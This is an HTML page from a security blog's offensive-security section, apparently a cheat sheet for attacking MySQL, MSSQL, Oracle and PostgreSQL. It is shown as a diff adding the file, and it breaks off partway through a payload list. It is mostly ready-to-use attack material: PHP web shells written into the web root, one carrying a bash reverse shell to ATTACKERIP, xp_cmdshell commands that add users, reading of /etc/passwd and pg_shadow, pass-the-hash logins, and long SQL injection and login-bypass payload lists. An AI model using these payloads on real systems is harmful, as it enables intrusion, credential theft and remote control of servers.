@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SQL - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="SQL" />
+<meta property="og:description" content="General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tranquac.github.io/posts/sql/" /><meta property="og:image" content="https://tranquac.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-08T18:17:00&#43;07:00" />
+<meta property="article:modified_time" content="2021-06-08T18:17:00&#43;07:00" /><meta property="og:site_name" content="quactv blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tranquac.github.io/logo.png"/>
+
+<meta name="twitter:title" content="SQL"/>
+<meta name="twitter:description" content="General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root"/>
+<meta name="application-name" content="quactv blog">
+<meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://tranquac.github.io/posts/sql/" /><link rel="prev" href="https://tranquac.github.io/posts/xxe/" /><link rel="next" href="https://tranquac.github.io/posts/linux-backdoors/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SQL",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/tranquac.github.io\/posts\/sql\/"
+        },"genre": "posts","keywords": "SQL","wordcount":  1368 ,
+        "url": "https:\/\/tranquac.github.io\/posts\/sql\/","datePublished": "2021-06-08T18:17:00+07:00","dateModified": "2021-06-08T18:17:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "quactv"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="quactv">&gt; root@quactv:~#</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/write-up/"> Write-up </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="quactv">&gt; root@quactv:~#</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/write-up/" title="">Write-up</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SQL</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>quactv</a></span>&nbsp;<span class="post-category">included in <a href="/categories/offensive-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Offensive Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-06-08">2021-06-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1368 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#mysql-3306">MySQL-3306</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#mssql-1433">MSSQL-1433</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#oracle-1521">Oracle-1521</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#postgressql-5432">PostgresSQL-5432</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bad-character-detect">Bad character detect</a></li>
+        <li><a href="#authen-bypass">Authen bypass</a></li>
+        <li><a href="#sql-injection-bypass-filter">SQL injection bypass filter</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><ul>
+<li><a href="#general" rel="">General</a>
+<ul>
+<li><a href="#mysql-3306" rel="">MySQL (3306)</a></li>
+<li><a href="#mssql-1433" rel="">MSSQL (1433)</a></li>
+<li><a href="#oracle-1521" rel="">Oracle (1521)</a></li>
+<li><a href="#postgressql-5432" rel="">PostgresSQL (5432)</a></li>
+</ul>
+</li>
+<li><a href="#sql-injection" rel="">SQL Injection</a>
+<ul>
+<li><a href="#bad-character-detect" rel="">Bad character detect</a></li>
+<li><a href="#authen-bypass" rel="">Authen bypass</a></li>
+<li><a href="#sql-injection-bypass-filter" rel="">Sql injection bypass filter</a></li>
+</ul>
+</li>
+<li><a href="#sqlmap" rel="">SQLMAP</a></li>
+<li><a href="#reference" rel="">Reference</a></li>
+</ul>
+<h1 id="general">General</h1>
+<h2 id="mysql-3306">MySQL-3306</h2>
+<h4 id="nmap">Nmap</h4>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -Pn -sV -p <span class="m">3306</span> --script mysql* TARGETIP
+</code></pre></div><h4 id="access-remotely">Access Remotely:</h4>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="k">host</span><span class="o">=</span><span class="n">TARGETIP</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;show databases;&#39;</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">DBNAME</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;select * from TABLENAME;&#39;</span><span class="w">
+</span></code></pre></div><h4 id="access-locally">Access Locally:</h4>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">DBNAME</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="w">
+</span></code></pre></div><h4 id="command-backdoor-example">Command Backdoor example:</h4>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;/var/www/html/backdoor.php&#34;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;/tmp/shell.php&#34;</span><span class="p">;</span><span class="w">
+</span></code></pre></div><h4 id="update-a-field-example-ie-change-a-password">Update a field example: (i.e. change a password):</h4>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">update</span><span class="w"> </span><span class="n">TABLENAME</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">PASSWORDFIELD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;NEWHASH&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">USERNAMEFIELD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;USERNAME&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></div><h4 id="phpmyadmin">PHPMyAdmin</h4>
+<p>Default User: root<br>
+Default Password: (none)<br>
+Create a new table, then go to the SQL tab</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;C:\\xampp\\htdocs\\command.php&#34;</span><span class="p">;</span><span class="o">`</span><span class="w">
+</span><span class="w"></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">TARGTEIP</span><span class="o">/</span><span class="n">phpmyadmin</span><span class="o">/</span><span class="n">command</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ipconfig</span><span class="w">
+</span></code></pre></div><h2 id="mssql-1433">MSSQL-1433</h2>
+<p>Default username : sa</p>
+<h4 id="nmap-1">Nmap</h4>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span class="m">1433</span> --script ms-sql-brute --script-args
+<span class="nv">userdb</span><span class="o">=</span>users.txt,passdb<span class="o">=</span>passwords.txt TARGETIP
+nmap -p <span class="m">1433</span> --script ms-sql-xp-cmdshell --script-args
+mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>sa,ms-sql-xp-cmdshell.cmd<span class="o">=</span><span class="s2">&#34;net usertester Tester123! /add&#34;</span> TARGETIP
+</code></pre></div><h4 id="sqsh">Sqsh.</h4>
+<p><a href="https://sourceforge.net/projects/sqsh/" target="_blank" rel="noopener noreffer ">https://sourceforge.net/projects/sqsh/</a><br>
+You can use sqsh to interact with MSSQL databases.<br>
+Install the following:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apt-get install freetds
+apt-get install sqsh
+</code></pre></div><p>Edit /etc/freetds/freetds.conf</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>SERVERNAME<span class="o">]</span>
+<span class="nv">host</span> <span class="o">=</span> 10.11.12.13
+<span class="nv">port</span> <span class="o">=</span> <span class="m">1433</span>
+tds <span class="nv">version</span> <span class="o">=</span> 8.0
+</code></pre></div><p>Edit .sqshrc<br>
+<code>\set style=vert</code><br>
+Connect to the database:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sqsh -S SERVERNAME -U USER -P PASSWORD
+&gt;exec xp_cmdshell <span class="s1">&#39;whoami&#39;</span>
+&gt;go
+</code></pre></div><p>Metasploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">use auxiliary/scanner/mssql/mssql_login
+use exploit/windows/mssql/mssql_payload
+</code></pre></div><h4 id="impacket">Impacket.</h4>
+<p>Get SQL Shell<br>
+<code>mssqlclient.exe quabbles/sqladmin@192.168.3.73 -windows-auth</code><br>
+Using proxy<br>
+<code>proxychains python mssqlclient.py quabbles/sqladmin@192.168.x.x -windows-auth</code><br>
+Run mssql.txt file when authen success (mssql account)<br>
+<code>proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt</code><br>
+Run mssql.txt file when authen success (win authen)<br>
+<code>proxychains python mssqlclient.py -p 1433 quabbles/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt</code><br>
+Can using PTH if can<br>
+<code>mssqlclient.exe -p 1433 -hashes :&quot;hash&quot; quabbles/sqladmin@192.168.x.x -file command.txt -windows-auth</code><br>
+<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py</a>
+<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<h2 id="oracle-1521">Oracle-1521</h2>
+<h4 id="nmap-2">Nmap:</h4>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span class="m">1521</span> --script<span class="o">=</span>oracle-sid-brute TARGETIP
+nmap -sV -Pn -p <span class="m">1521</span> --script<span class="o">=</span>oracle-enum-users --script-args <span class="nv">sid</span><span class="o">=</span>ORCL,userdb<span class="o">=</span>users.txt TARGETIP
+</code></pre></div><h4 id="connect-to-oracle-from-command-line">Connect to Oracle from command line:</h4>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\&gt;</span>sqlplus / as sysdba
+<span class="o">[</span>will prompt <span class="k">for</span> password<span class="o">]</span>
+C:<span class="se">\&gt;</span>sqlplus
+<span class="o">[</span>will prompt <span class="k">for</span> user and password<span class="o">]</span>
+</code></pre></div><h4 id="oracle-default-accounts">Oracle Default Accounts:</h4>
+<p><a href="https://www.orafaq.com/wiki/List_of_default_database_users" target="_blank" rel="noopener noreffer ">https://www.orafaq.com/wiki/List_of_default_database_users</a>
+<a href="http://www.petefinnigan.com/default/default_password_list.htm" target="_blank" rel="noopener noreffer ">http://www.petefinnigan.com/default/default_password_list.htm</a><br>
+Examples: applsys|apps; ctxsys|ctxsys;dbsnmp|dbsnmp &hellip;</p>
+<h2 id="postgressql-5432">PostgresSQL-5432</h2>
+<p>Default User: postgres
+Default Password: (none)
+Local Login:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">psql -d DATABASE -U USER
+</code></pre></div><p>Remote Login:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">psql -h TARGETIP -d DATABASE -U USER
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="k">select</span> version<span class="o">()</span><span class="p">;</span>	
+<span class="k">select</span> current_database<span class="o">()</span><span class="p">;</span>
+<span class="k">select</span> current_user<span class="p">;</span>
+<span class="k">select</span> session_user<span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;log_connections&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;log_statement&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;port&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;password_encryption&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;krb_server_keyfile&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;virtual_host&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;port&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;config_file&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;hba_file&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> current_setting<span class="o">(</span><span class="s1">&#39;data_directory&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> * from pg_shadow<span class="p">;</span>
+<span class="k">select</span> * from pg_group<span class="p">;</span>
+create table myfile <span class="o">(</span>input TEXT<span class="o">)</span><span class="p">;</span>
+copy myfile from <span class="s1">&#39;/etc/passwd&#39;</span><span class="p">;</span> 
+<span class="k">select</span> * from myfile<span class="p">;</span>copy myfile to /tmp/test<span class="p">;</span>
+</code></pre></div><h1 id="sql-injection">SQL Injection</h1>
+<h3 id="bad-character-detect">Bad character detect</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="s1">&#39;
+</span><span class="s1">&#39;&#39;
+</span><span class="s1">`
+</span><span class="s1">``
+</span><span class="s1">,
+</span><span class="s1">&#34;
+</span><span class="s1">&#34;&#34;
+</span><span class="s1">/
+</span><span class="s1">//
+</span><span class="s1">\
+</span><span class="s1">\\
+</span><span class="s1">;
+</span><span class="s1">&#39;</span> or <span class="s2">&#34;
+</span><span class="s2">-- or # 
+</span><span class="s2">&#39; OR &#39;1
+</span><span class="s2">&#39; OR 1 -- -
+</span><span class="s2">&#34;</span> OR <span class="s2">&#34;&#34;</span> <span class="o">=</span> <span class="s2">&#34;
+</span><span class="s2">&#34;</span> OR <span class="nv">1</span> <span class="o">=</span> <span class="m">1</span> -- -
+<span class="s1">&#39; OR &#39;&#39; = &#39;</span>
+<span class="s1">&#39;=&#39;</span>
+<span class="s1">&#39;LIKE&#39;</span>
+<span class="s1">&#39;=0--+
+</span><span class="s1"> OR 1=1
+</span><span class="s1">&#39;</span> OR <span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x
+</span><span class="s1">&#39;</span> AND id IS NULL<span class="p">;</span> --
+<span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;</span><span class="m">2</span>
+%00
+/*…*/ 
++
+<span class="o">||</span>
+%
+AND <span class="m">1</span>
+AND <span class="m">0</span>
+AND <span class="nb">true</span>
+AND <span class="nb">false</span>
+1-false
+1-true
+1*56
+-2
+1<span class="s1">&#39; ORDER BY 1--+
+</span><span class="s1">1&#39;</span> ORDER BY 2--+
+1<span class="s1">&#39; ORDER BY 3--+
+</span><span class="s1">1&#39;</span> ORDER BY 1,2--+
+1<span class="s1">&#39; ORDER BY 1,2,3--+
+</span><span class="s1">1&#39;</span> GROUP BY 1,2,--+
+1<span class="s1">&#39; GROUP BY 1,2,3--+
+</span><span class="s1">&#39;</span> GROUP BY columnnames having <span class="nv">1</span><span class="o">=</span><span class="m">1</span> -- - 
+-1<span class="s1">&#39; UNION SELECT 1,2,3--+
+</span><span class="s1">&#39;</span> UNION SELECT sum<span class="o">(</span>columnname <span class="o">)</span> from tablename -- - 
+-1 UNION SELECT <span class="m">1</span> INTO @,@
+-1 UNION SELECT <span class="m">1</span> INTO @,@,@
+<span class="m">1</span> AND <span class="o">(</span>SELECT * FROM Users<span class="o">)</span> <span class="o">=</span> 1	
+<span class="s1">&#39; AND MID(VERSION(),1,1) = &#39;</span>5<span class="s1">&#39;;
+</span><span class="s1">&#39;</span> and <span class="m">1</span> in <span class="o">(</span><span class="k">select</span> min<span class="o">(</span>name<span class="o">)</span> from sysobjects where <span class="nv">xtype</span> <span class="o">=</span> <span class="s1">&#39;U&#39;</span> and name &gt; <span class="s1">&#39;.&#39;</span><span class="o">)</span> --
+,<span class="o">(</span><span class="k">select</span> * from <span class="o">(</span><span class="k">select</span><span class="o">(</span>sleep<span class="o">(</span>10<span class="o">)))</span>a<span class="o">)</span>
+%2c<span class="o">(</span><span class="k">select</span>%20*%20from%20<span class="o">(</span><span class="k">select</span><span class="o">(</span>sleep<span class="o">(</span>10<span class="o">)))</span>a<span class="o">)</span>
+<span class="s1">&#39;;WAITFOR DELAY &#39;</span>0:0:30<span class="s1">&#39;--
+</span><span class="s1">#
+</span><span class="s1">/*
+</span><span class="s1">-- -
+</span><span class="s1">;%00
+</span><span class="s1">`
+</span><span class="s1">/?q=1
+</span><span class="s1">/?q=1&#39;</span>
+/?q<span class="o">=</span>1<span class="s2">&#34;
+</span><span class="s2">/?q=[1]
+</span><span class="s2">/?q[]=1
+</span><span class="s2">/?q=1`
+</span><span class="s2">/?q=1\
+</span><span class="s2">/?q=1/*&#39;*/
+</span><span class="s2">/?q=1/*!1111&#39;*/
+</span><span class="s2">/?q=1&#39;||&#39;asd&#39;||&#39;
+</span><span class="s2">/?q=1&#39; or &#39;1&#39;=&#39;1
+</span><span class="s2">/?q=1 or 1=1
+</span><span class="s2">/?q=&#39;or&#39;&#39;=&#39;
+</span></code></pre></div><h3 id="authen-bypass">Authen bypass</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="s1">&#39;-&#39;</span>
+<span class="s1">&#39; &#39;</span>
+<span class="s1">&#39;&amp;&#39;</span>
+<span class="s1">&#39;^&#39;</span>
+<span class="s1">&#39;*&#39;</span>
+<span class="s1">&#39; or &#39;&#39;-&#39;</span>
+<span class="s1">&#39; or &#39;&#39; &#39;</span>
+<span class="s1">&#39; or &#39;&#39;&amp;&#39;</span>
+<span class="s1">&#39; or &#39;&#39;^&#39;</span>
+<span class="s1">&#39; or &#39;&#39;*&#39;</span>
+<span class="s2">&#34;-&#34;</span>
+<span class="s2">&#34; &#34;</span>
+<span class="s2">&#34;&amp;&#34;</span>
+<span class="s2">&#34;^&#34;</span>
+<span class="s2">&#34;*&#34;</span>
+<span class="s2">&#34; or &#34;&#34;-&#34;</span>
+<span class="s2">&#34; or &#34;&#34; &#34;</span>
+<span class="s2">&#34; or &#34;&#34;&amp;&#34;</span>
+<span class="s2">&#34; or &#34;&#34;^&#34;</span>
+<span class="s2">&#34; or &#34;&#34;*&#34;</span>
+or true--
+<span class="s2">&#34; or true--
+</span><span class="s2">&#39; or true--
+</span><span class="s2">&#34;</span><span class="o">)</span> or true--
+<span class="s1">&#39;) or true--
+</span><span class="s1">&#39;</span> or <span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x
+</span><span class="s1">&#39;</span><span class="o">)</span> or <span class="o">(</span><span class="s1">&#39;x&#39;</span><span class="o">)=(</span><span class="s1">&#39;x
+</span><span class="s1">&#39;</span><span class="o">))</span> or <span class="o">((</span><span class="s1">&#39;x&#39;</span><span class="o">))=((</span><span class="s1">&#39;x
+</span><span class="s1">&#34; or &#34;x&#34;=&#34;x
+</span><span class="s1">&#34;) or (&#34;x&#34;)=(&#34;x
+</span><span class="s1">&#34;)) or ((&#34;x&#34;))=((&#34;x
+</span><span class="s1">or 1=1
+</span><span class="s1">or 1=1--
+</span><span class="s1">or 1=1#
+</span><span class="s1">or 1=1/*
+</span><span class="s1">admin&#39;</span> --
+admin<span class="s1">&#39; #
+</span><span class="s1">admin&#39;</span>/*
+admin<span class="s1">&#39; or &#39;</span>1<span class="s1">&#39;=&#39;</span><span class="m">1</span>
+admin<span class="s1">&#39; or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;--
+</span><span class="s1">admin&#39;</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="c1">#</span>
+admin<span class="s1">&#39; or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;/*
+</span><span class="s1">admin&#39;</span>or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> or <span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;
+</span><span class="s1">admin&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span>
+admin<span class="s1">&#39; or 1=1--
+</span><span class="s1">admin&#39;</span> or <span class="nv">1</span><span class="o">=</span>1#
+admin<span class="s1">&#39; or 1=1/*
+</span><span class="s1">admin&#39;</span><span class="o">)</span> or <span class="o">(</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1
+</span><span class="s1">admin&#39;</span><span class="o">)</span> or <span class="o">(</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>--
+admin<span class="s1">&#39;) or (&#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;#
+</span><span class="s1">admin&#39;</span><span class="o">)</span> or <span class="o">(</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>/*
+admin<span class="s1">&#39;) or &#39;</span>1<span class="s1">&#39;=&#39;</span><span class="m">1</span>
+admin<span class="s1">&#39;) or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;--
+</span><span class="s1">admin&#39;</span><span class="o">)</span> or <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="c1">#</span>
+admin<span class="s1">&#39;) or &#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="s1">&#39;/*
+</span><span class="s1">1234 &#39;</span> AND <span class="nv">1</span><span class="o">=</span><span class="m">0</span> UNION ALL SELECT <span class="s1">&#39;admin&#39;</span>, <span class="s1">&#39;81dc9bdb52d04dc20036dbd8313ed055
+</span><span class="s1">admin&#34; --
+</span><span class="s1">admin&#34; #
+</span><span class="s1">admin&#34;/*
+</span><span class="s1">admin&#34; or &#34;1&#34;=&#34;1
+</span><span class="s1">admin&#34; or &#34;1&#34;=&#34;1&#34;--
+</span><span class="s1">admin&#34; or &#34;1&#34;=&#34;1&#34;#
+</span><span class="s1">admin&#34; or &#34;1&#34;=&#34;1&#34;/*
+</span><span class="s1">admin&#34;or 1=1 or &#34;&#34;=&#34;
+</span><span class="s1">admin&#34; or 1=1
+</span><span class="s1">admin&#34; or 1=1--
+</span><span class="s1">admin&#34; or 1=1#
+</span><span class="s1">admin&#34; or 1=1/*
